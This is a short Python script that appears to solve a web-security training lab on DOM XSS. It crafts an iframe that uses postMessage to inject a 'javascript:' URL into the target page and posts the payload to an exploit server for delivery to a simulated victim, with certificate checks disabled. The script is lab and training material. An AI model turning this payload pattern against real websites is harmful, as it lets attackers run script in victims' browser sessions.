import requests
import urllib3
from colorama import Fore

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

LAB_NAME = "DOM XSS using web messages and a JavaScript URL"

def run(url, payload, proxies=None):
    print(Fore.YELLOW + f"Steps to solve the lab:")
    print(Fore.WHITE + f"""1. Craft an iframe that, upon loading, will send an XSS payload using the postMessage API\n2. Deliver the exploit to the victim\n""")

    response_head = "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8"
    url = url.rstrip('/')
    payload = f"""<iframe src="{url}/" onload="this.contentWindow.postMessage('javascript:print()//http:','*')">"""

    data = {"responseBody": payload, "responseHead": response_head,
            "formAction": "DELIVER_TO_VICTIM", "urlIsHttps": "on", "responseFile": "/exploit"}

    user_input = input("[?] Enter the exploit server URL: ").strip()
    string = f"'{user_input}'"

    try:
        r = requests.post(user_input.rstrip('/'), data,
                          verify=False, proxies=proxies)
        res = r.text
        return True
    except Exception as e:
        print(f"[!] Error: {e}")
        return False
